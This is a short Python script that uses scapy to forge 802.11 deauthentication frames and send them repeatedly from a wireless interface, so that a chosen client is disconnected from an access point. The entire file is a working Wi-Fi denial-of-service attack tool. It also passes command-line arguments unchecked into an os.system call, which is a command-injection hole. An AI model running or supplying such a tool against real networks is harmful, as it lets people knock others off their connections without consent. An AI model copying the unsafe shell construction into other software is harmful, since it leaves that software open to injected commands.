from scapy.all import (
    RadioTap,
    Dot11,
    Dot11Deauth,
    sendp
)
import sys,os

interface=sys.argv[1]
ap_mac=sys.argv[2]
channel=sys.argv[3]
target_mac=sys.argv[4]
counts=10

packet=RadioTap()/Dot11(addr1=target_mac,addr2=ap_mac,addr3=ap_mac)/Dot11Deauth(reason=7)

if __name__ == '__main__':
    change_channel="iwconfig "+interface+" channel "+channel
    os.system(change_channel)
    for i in range(counts):
        print ("Sending Deauth Packets To "+target_mac+" BSSID : "+ap_mac)
        sendp(packet,iface=interface,count=2,inter=0.5,verbose=0)
